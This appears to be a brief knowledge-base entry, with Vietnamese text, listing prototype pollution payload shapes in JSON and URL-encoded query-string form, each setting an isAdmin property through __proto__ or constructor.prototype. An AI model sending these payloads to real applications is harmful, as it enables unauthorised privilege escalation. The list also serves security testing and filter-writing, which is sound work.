---
title: Prototype Pollution Payload Shapes
type: entity
related: [[Prototype Pollution]]
---

Các payload shapes được nhắc đến:

```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
{"__proto__.polluted": "yes"}
```

Và dạng URL-encoded:

- `?__proto__[isAdmin]=true`
- `?constructor[prototype][isAdmin]=true`